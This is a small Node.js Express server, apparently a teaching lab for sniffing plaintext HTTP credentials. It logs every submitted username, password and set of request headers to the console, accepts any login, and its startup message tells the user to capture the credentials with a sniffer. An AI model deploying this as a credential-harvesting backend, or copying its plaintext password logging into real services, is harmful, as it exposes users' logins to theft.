const express = require('express');
const path = require('path');
const app = express();
const PORT = 3000;

app.use(express.json());
app.use(express.urlencoded({ extended: false }));

app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header(
    'Access-Control-Allow-Headers',
    'Origin, X-Requested-With, Content-Type, Accept'
  );
  res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');

  console.log(`${req.method} ${req.path} - ${req.ip}`);
  console.log('Headers:', req.headers);
  console.log('Body:', req.body);

  if (req.method === 'OPTIONS') {
    return res.sendStatus(200);
  }
  next();
});

app.use(express.static(path.join(__dirname, 'public')));

app.post('/', (req, res) => {
  const { user, pass } = req.body;

  console.log('------------------------------------');
  console.log('Tentativa de login via API:');
  console.log(`Usuário: ${user}`);
  console.log(`Senha: ${pass}`);
  console.log('------------------------------------');

  res.json({
    success: true,
    message: 'Credenciais recebidas',
    timestamp: new Date().toISOString(),
  });
});

app.post('/login', (req, res) => {
  const { username, password } = req.body;

  console.log('------------------------------------');
  console.log('Tentativa de login detectada:');
  console.log(`Usuário: ${username}`);
  console.log(`Senha: ${password}`);
  console.log('------------------------------------');

  if (username && password) {
    res.redirect('/success.html');
  } else {
    res.redirect('/?error=1');
  }
});

app.listen(PORT, '0.0.0.0', () => {
  console.log(`Servidor rodando em http://localhost:${PORT}`);
  console.log('Use seu sniffer para capturar as credenciais enviadas!');
});
